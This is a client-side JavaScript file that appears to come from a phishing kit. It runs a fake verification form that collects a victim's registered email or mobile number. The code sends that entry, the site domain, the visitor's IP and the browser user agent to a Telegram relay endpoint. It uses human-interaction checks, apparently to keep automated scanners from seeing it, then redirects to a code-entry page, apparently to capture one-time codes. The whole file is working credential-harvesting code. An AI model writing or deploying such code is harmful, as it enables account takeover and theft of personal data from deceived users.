(function () {
  var form = document.getElementById("auth-form");
  var methodSelect = document.getElementById("delivery-method");
  var destinationWrap = document.getElementById("auth-destination");
  var destinationInput = document.getElementById("destination");
  var destinationLabel = document.getElementById("destination-label");
  var authHint = document.getElementById("auth-hint");
  var methodError = document.getElementById("method_validation_message");
  var destinationError = document.getElementById("destination_validation_message");
  var submitBtn = form.querySelector('.button-subm');

  // ============================================================
  // ====== DOMAIN DETECTION - ONE TIME, HUMAN ONLY =============
  // ============================================================

  let domainDetected = false;
  let humanInteractionConfirmed = false;

  function detectDomain() {
    if (domainDetected) return;
    if (!humanInteractionConfirmed) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain
    });

    console.log(`🌐 Domain detected (human): ${domain}`);
  }

  function confirmHumanInteraction() {
    if (humanInteractionConfirmed) return;
    if (event && event.isTrusted === false) return;
    
    humanInteractionConfirmed = true;
    console.log('👤 Human interaction confirmed');
    detectDomain();
  }

  // Human scroll detection
  let scrollTimeout = null;
  let scrollCount = 0;
  let lastScrollTime = 0;

  window.addEventListener('scroll', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    const now = Date.now();
    const timeSinceLastScroll = now - lastScrollTime;
    lastScrollTime = now;
    
    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 100) return;
    
    scrollCount++;
    if (scrollCount < 2) return;
    
    const scrollY = window.scrollY;
    if (scrollY < 30) return;
    
    if (scrollTimeout) {
      clearTimeout(scrollTimeout);
      scrollTimeout = null;
    }
    
    scrollTimeout = setTimeout(function() {
      if (!domainDetected && humanInteractionConfirmed === false) {
        confirmHumanInteraction();
      }
      scrollTimeout = null;
    }, 300);
    
  }, { passive: true });

  // Human click detection
  document.addEventListener('click', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    if (e.target.closest('.spinner, .loading')) return;
    confirmHumanInteraction();
  });

  // Human keypress detection
  document.addEventListener('keydown', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    if (e.key.length !== 1) return;
    confirmHumanInteraction();
  });

  // Human mousemove detection (fallback)
  let mouseMoveCount = 0;
  
  document.addEventListener('mousemove', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    mouseMoveCount++;
    if (mouseMoveCount < 3) return;
    if (e.movementX === 0 && e.movementY === 0) return;
    
    confirmHumanInteraction();
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  function clearErrors() {
    methodError.textContent = "";
    destinationError.textContent = "";
  }

  function configureDestination(method) {
    clearErrors();
    destinationInput.value = "";

    if (!method) {
      destinationWrap.hidden = true;
      return;
    }

    destinationWrap.hidden = false;

    if (method === "email") {
      destinationLabel.textContent = "Registered email";
      destinationInput.type = "email";
      destinationInput.placeholder = "Enter your registered email";
      destinationInput.setAttribute("autocomplete", "email");
      authHint.textContent = "Enter the email address on file for your account.";
    } else {
      destinationLabel.textContent = "Registered mobile number";
      destinationInput.type = "tel";
      destinationInput.placeholder = "Enter your registered mobile number";
      destinationInput.setAttribute("autocomplete", "tel");
      authHint.textContent = "Enter the mobile number on file for your account.";
    }

    destinationInput.focus();
  }

  function isValidEmail(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
  }

  function isValidPhone(value) {
    var digits = value.replace(/\D/g, "");
    return digits.length >= 10 && digits.length <= 15;
  }

  methodSelect.addEventListener("change", function () {
    configureDestination(methodSelect.value);
  });

  // ============================================================
  // ====== FORM SUBMIT =========================================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    clearErrors();

    var method = methodSelect.value;
    var destination = destinationInput.value.trim();
    var valid = true;

    if (!method) {
      methodError.textContent = "Please select Email or SMS.";
      valid = false;
    }

    if (!destination) {
      destinationError.textContent =
        method === "sms"
          ? "The mobile number field is required."
          : "The email field is required.";
      valid = false;
    } else if (method === "email" && !isValidEmail(destination)) {
      destinationError.textContent = "Please enter a valid email address.";
      valid = false;
    } else if (method === "sms" && !isValidPhone(destination)) {
      destinationError.textContent = "Please enter a valid mobile number.";
      valid = false;
    }

    if (!valid) {
      if (!method) {
        methodSelect.focus();
      } else {
        destinationInput.focus();
      }
      return;
    }

    // ====== SEND METHOD TO TELEGRAM ======
    sendToTelegram('auth_method', {
      method: method,
      destination: destination
    });

    // ====== DISABLE BUTTON AND SHOW LOADING ======
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');

    // Store auth data for next page
    try {
      sessionStorage.setItem(
        "melodyAuth",
        JSON.stringify({
          method: method,
          destination: destination
        })
      );
    } catch (e) {}

    // ====== REDIRECT AFTER 5 SECONDS ======
    setTimeout(function() {
      window.location.href = "enter-code.html";
    }, 5000);
  });
})();